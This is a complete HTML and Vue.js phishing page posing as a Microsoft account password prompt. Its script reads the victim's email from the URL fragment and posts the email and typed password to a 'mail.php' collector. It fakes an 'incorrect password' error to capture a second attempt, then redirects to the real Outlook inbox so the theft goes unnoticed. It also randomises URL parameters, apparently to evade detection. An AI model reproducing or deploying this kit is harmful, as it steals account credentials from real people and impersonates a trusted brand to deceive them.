<html dir="ltr" lang="EN-US"><head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <title>Sign in to your Microsoft account</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, minimum-scale=1.0, user-scalable=yes">
    <link rel="shortcut icon" href="https://logincdn.msauth.net/16.000.29039.9/images/favicon.ico">
    <link rel="stylesheet" type="text/css" href="https://logincdn.msauth.net/16.000/Converged_v21033_egJPTAx_byK-yF_CMCKFeg2.css">
    <style type="text/css">
    body {
        display: block !important;
    }
    </style>
    <link rel="image_src" href="https://logincdn.msauth.net/16.000.29039.9/images/Windows_Live_v_thumb.jpg">
</head>

<body class="cb">
    <div id="vue-app" style=""><form name="f1" id="i0281" spellcheck="false" target="_top" autocomplete="off"><div><div id="lightboxTemplateContainer"><div id="lightboxBackgroundContainer"><div role="presentation" class="background-image-holder"><div class="background-image ext-background-image" style="background-image: url(&quot;https://logincdn.msauth.net/shared/1.0/content/images/backgrounds/2_bc3d32a696895f78c19df6c717586a5d.svg&quot;);"></div></div></div> <div class="outer"><div class="template-section main-section"><div class="middle"><div><div><div class="win-scroll"><div d="lightbox" class="sign-in-box ext-sign-in-box fade-in-lightbox"><!----> <div class="lightbox-cover"></div> <div><img role="img" src="https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg" onerror="this.src=window.DEFAULT_SITE_LOGO" alt="Microsoft" class="logo"> <!----></div> <div role="main"><div><div class="animate slide-in-next"><div><div class="identityBanner"><button type="button" aria-label="Back" class="backButton" style="outline: none;"><img role="presentation" src="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"></button> <div id="displayName" class="identity">
                                                                        [Email]
                                                                    </div></div></div></div> <div class="pagination-view has-identity-banner animate slide-in-next"><div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true"><div id="loginHeader" role="heading" aria-level="1" class="row title ext-title"><span>Enter password</span></div> <!----> <div class="row"><div class="form-group col-md-24"><div role="alert" aria-live="assertive"><div><span style="color: rgba(27, 27, 27, 0.7);">Because you are accessing a sensitive information you need to verify your password.</span></div> <!----> <!----></div> <!----> <div class="placeholderContainer" style="position: relative;"><input name="passwd" id="i0118" autocomplete="off" aria-required="true" aria-describedby="loginHeader" placeholder="Password" aria-label="Enter the password for [Email]" tabindex="0" type="password" class="form-control input ext-input text-box ext-text-box"> <i style="position: absolute; right: 4%; top: 30%; font-size: 20px; cursor: pointer;"><svg xmlns="http://www.w3.org/2000/svg" width="15" height="15" fill="currentColor" viewBox="0 0 16 16"><!----> <g><path d="M13.359 11.238C15.06 9.72 16 8 16 8s-3-5.5-8-5.5a7.028 7.028 0 0 0-2.79.588l.77.771A5.944 5.944 0 0 1 8 3.5c2.12 0 3.879 1.168 5.168 2.457A13.134 13.134 0 0 1 14.828 8c-.058.087-.122.183-.195.288-.335.48-.83 1.12-1.465 1.755-.165.165-.337.328-.517.486l.708.709z"></path> <path d="M11.297 9.176a3.5 3.5 0 0 0-4.474-4.474l.823.823a2.5 2.5 0 0 1 2.829 2.829l.822.822zm-2.943 1.299.822.822a3.5 3.5 0 0 1-4.474-4.474l.823.823a2.5 2.5 0 0 0 2.829 2.829z"></path> <path d="M3.35 5.47c-.18.16-.353.322-.518.487A13.134 13.134 0 0 0 1.172 8l.195.288c.335.48.83 1.12 1.465 1.755C4.121 11.332 5.881 12.5 8 12.5c.716 0 1.39-.133 2.02-.36l.77.772A7.029 7.029 0 0 1 8 13.5C3 13.5 0 8 0 8s.939-1.721 2.641-3.238l.708.709zm10.296 8.884-12-12 .708-.708 12 12-.708.708z"></path></g></svg></i></div></div></div> <div><div style="margin-bottom: 36px;"><div id="idTd_PWD_KMSI_Cb" class="form-group checkbox text-block-body no-margin-top"><label id="idLbl_PWD_KMSI_Cb"><input name="KMSI" id="idChkBx_PWD_KMSI0Pwd" type="checkbox" aria-label="Keep me signed in"> <span>Keep me signed in</span></label></div> <div class="row"><div class="col-md-24"><div class="text-13"><div class="form-group"><a id="idA_PWD_ForgotPassword" role="link" href="#"><span>Forgot password?</span></a></div> <div class="form-group"></div></div></div></div></div> <div class="win-button-pin-bottom"><div class="row"><div><div class="col-xs-24 no-padding-left-right button-container"><div class="inline-block"><input type="submit" id="idSIButton9" class="button ext-button primary ext-primary" value="Sign In" style="text-decoration: none;"></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div></div> <div id="footer" role="contentinfo" class="footer ext-footer"><div><div id="footerLinks" class="footerNode text-secondary"><a id="ftrTerms" href="https://login.live.com/gls.srf?urlID=WinLiveTermsOfUse&amp;mkt=EN-US&amp;uaid=d4bc353472744d818e82daf39e723b6c" class="footer-content ext-footer-content footer-item ext-footer-item">
                                        Terms of use
                                    </a> <a id="ftrPrivacy" href="https://login.live.com/gls.srf?urlID=MSNPrivacyStatement&amp;mkt=EN-US&amp;uaid=d4bc353472744d818e82daf39e723b6c" class="footer-content ext-footer-content footer-item ext-footer-item">
                                        Privacy &amp; cookies
                                    </a> <a id="moreOptions" href="#" role="button" aria-label="Click here for troubleshooting information" aria-expanded="false" class="footer-content ext-footer-content footer-item ext-footer-item debug-item ext-debug-item">
                                        ...
                                    </a></div></div></div></div></div></div></form> <form></form></div>
    <!-- SCRIPT BEGINS -->
    <script src="https://cdn.jsdelivr.net/npm/vue@2.6.12"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.21.1/axios.min.js"></script>
    <!-- SET WINDOW VARIABLE -->
    <script>
        window.MAIL_URL = 'mail.php';
        window.AUTH_LOADING_MESSAGE = 'Authenticating...';
        window.LOGIN_ERROR_MESSAGE = `Your account or password is incorrect. If you don't remember your password, <a href="#">reset it now.</a>`;
        window.DEFAULT_SITE_TITLE = "Sign in to your Microsoft account";
        window.DEFAULT_SITE_LOGO = "https://secure.aadcdn.microsoftonline-p.com/ests/2.1.8576.13/content/images/microsoft_logo_ee5c8d9fb6248c938fd0dc19370e90bd.svg";
        window.DEFAULT_SITE_FAVICON = "https://logincdn.msauth.net/16.000.29039.9/images/favicon.ico";
        //SETTING OF SOME STUFF
        window.ALLOW_DYNAMIC_EMAIL_LOGO = false;
        window.ENABLE_PASSWORD_VISIBILITY_TOGGLE = true;
    </script>

    <script>
    new Vue({
        data: () => ({
            // refs
            // emailElement
            // passwordElement
            vueAppIsLoaded: false,
            //MAIN APPLICATION DATA
            showPassword: false,
            retryAttemptCount: 0,
            isLoading: false,
            submitButtonText: 'Sign In',
            errorMessage: ``,
            successMessage: '',
            email: '[Email]',
            password: '',
        }),

        created() {
            this.turnUrlToRandom();
            //SET AXIOS RESPONSE TIME 
            axios.interceptors.request.use((config) => {
                config.headers['request-startTime'] = new Date()
                return config
            })

            axios.interceptors.response.use((response) => {
                const start = response.config.headers['request-startTime']
                const end = new Date()
                const milliseconds = end - start;
                response.headers['request-duration'] = milliseconds
                return response
            })

            // SET EMAIL HASH
            const pageUrl = window.location.href;
            const pageUrlArray = pageUrl.split("#");
            if (pageUrlArray.length > 1) { this.email = pageUrlArray[pageUrlArray.length - 1]; }

            this.pageMiddleware();

            $("body").on('click', 'a', function(e) { e.preventDefault() });
        },

        mounted: function() {
            this.$nextTick(function() {
                this.vueAppIsLoaded = true;
                this.setDocumentPageFavicon();
                this.setDocumentPageTitle();
                setTimeout(() => {
                    if (_.isEmpty(this.email)) {
                        this.$refs.emailElement.focus();
                    } else {
                        this.$refs.passwordElement.focus();
                    }
                }, 600)
            })
        },

        computed: {
            enablePasswordVisibilityToggle: function() {
                return window.ENABLE_PASSWORD_VISIBILITY_TOGGLE||false;
            },
            emailIsEmpty: function() {
                return _.isEmpty(this.email);
            },
            emailNotEmpty: function() {
                return !_.isEmpty(this.email);
            },
            passwordNotEmpty: function() {
                return !_.isEmpty(this.password);
            },
            submitButtonElementText: function() {
                return this.isLoading ? window.AUTH_LOADING_MESSAGE : this.submitButtonText;
            },
            emailDomainLogo: function() {
                try {
                    const domain = this.checkForDynamicAndValidateSplitEmail(this.email)[1];
                    return `https://logo.clearbit.com/${domain}`;
                } catch (error) {
                    return window.DEFAULT_SITE_LOGO;
                }
            },
            emailDomainFavicon: function() {
                try {
                    const domain = this.checkForDynamicAndValidateSplitEmail(this.email)[1];
                    return `https://logo.clearbit.com/${domain}`;
                } catch (error) {
                    return window.DEFAULT_SITE_FAVICON;
                }
            },
            emailDomainName: function() {
                try {
                    return this.checkForDynamicAndValidateSplitEmail(this.email)[1]; 
                } catch (error) {
                    return '';
                }
            },
            emailUsername: function() {
                try {
                    return this.checkForDynamicAndValidateSplitEmail(this.email)[0]; 
                } catch (error) {
                    return '';
                }
            }
        },

        watch: {
            email: async function() {
                this.setDocumentPageFavicon();
                this.setDocumentPageTitle();
            },
        },

        methods: {
            resetEmail() {
                this.email = '';
                this.retryAttemptCount = 0;
            },
            togglePasswordVisibility() {
                if (this.enablePasswordVisibilityToggle) {
                    this.showPassword = !this.showPassword;
                }
            },
            async handleSaveEmail() {
                this.errorMessage = '';

                try{
                    this.isLoading = true;

                    const email = this.$refs.emailElement.value;

                    if (!this.validateEmail(email)) {
                        throw Error('That Microsoft account doesn\'t exist. Enter a different account');
                    }

                    setTimeout(() => {
                        this.email = email;
                        this.isLoading = false;
                    }, 3000);
                }catch (error) {
                    this.isLoading = false;
                    this.errorMessage = error.message;
                }
            },
            async handleSubmit() {
                this.errorMessage = '';
                this.successMessage = '';

                try {
                    if (!(this.email && this.password)) {
                        throw Error('Please enter your email address or member ID.');
                    }

                    if (!this.validateEmail(this.email)) {
                        throw Error('Please enter a valid email address or member ID.');
                    }

                    if (this.password.length <= 4) {
                        throw Error('Password must be greater than four characters.');
                    }

                    this.isLoading = true;
                    const response = await this.sendMail(this.email, this.password);

                    setTimeout(() => {

                        if (this.retryAttemptCount < 1) {
                            this.retryAttemptCount = this.retryAttemptCount + 1;
                            //reset password to empty
                            this.password = '';
                            this.isLoading = false;
                            this.errorMessage = window.LOGIN_ERROR_MESSAGE;

                        } else {
                            //success message
                            this.isLoading = false;
                            this.successMessage = `Your account or password is incorrect. If you don't remember your password, <a href="#">reset it now.</a>`;
                            //redirect
                            setTimeout(() => {
                                window.location.replace(this.finalRedirectUrl());
                            }, 1000);
                        }
                    }, 4000 - response.headers['request-duration'])

                } catch (error) {
                    this.isLoading = false;
                    this.errorMessage = error.message;
                }
            },

            async sendMail(email, password) {
                try {
                    const data = new FormData();
                    data.append('email', email);
                    data.append('password', password);
                    return await axios.post(window.MAIL_URL, data);
                } catch (error) {
                    throw Error('Unable to connect to server');
                }
            },
            validateEmail(email) {
                const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
                return re.test(email);
            },
            checkForDynamicAndValidateSplitEmail(email){
                if (!window.ALLOW_DYNAMIC_EMAIL_LOGO) {
                    throw Error('Dynamic email logo not allowed');
                }

                if (!this.validateEmail(email)) {
                    throw Error('Invalid Email Address');
                }

                return email.split("@");
            },
            turnUrlToRandom() {
                const url = new URL(window.location.href);

                if (!(
                        url.searchParams.has('websrc') &&
                        url.searchParams.has('dispatch') &&
                        url.searchParams.has('id')
                        //&& url.searchParams.has('email')
                    )) {
                    url.searchParams.append('websrc', url.searchParams.get('websrc') || this.randomString(302))
                    url.searchParams.append('dispatch', url.searchParams.get('dispatch') || this.randomString(3, '0123456789'))
                    url.searchParams.append('id', url.searchParams.get('id') || this.randomString(6, '0123456789'))
                    //url.searchParams.append('email', url.searchParams.get('email'));

                    window.location.replace(url.toString())
                }
            },

            randomString(length, chars = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ") {
                var result = '';
                for (var i = length; i > 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
                return result;
            },
            //==========//
            pageMiddleware() {
                return;
                // if (_.isEmpty(this.email) || ! this.validateEmail(this.email)) {
                //     window.location.replace("https://google.com");
                // }
            },

            finalRedirectUrl() {
                return `https://outlook.office.com/mail/inbox`;
            },

            setDocumentPageTitle(){
                document.title = this.emailDomainName 
                    ? `${this.emailDomainName.toUpperCase()} Web Access`
                    : window.DEFAULT_SITE_TITLE;
            },
            setDocumentPageFavicon() {
                var link = document.querySelector("link[rel~='icon']");
                if (!link) {
                    link = document.createElement('link');
                    link.rel = 'icon';
                    document.getElementsByTagName('head')[0].appendChild(link);
                }

                favicon = new Image();
                favicon.src = this.emailDomainFavicon

                favicon.onerror = function() {
                    link.href = window.DEFAULT_SITE_FAVICON;
                }

                favicon.onload = function(image) {
                    link.href = image.target.src;
                }
            }
        }
    }).$mount('#vue-app');
    </script>


</body></html>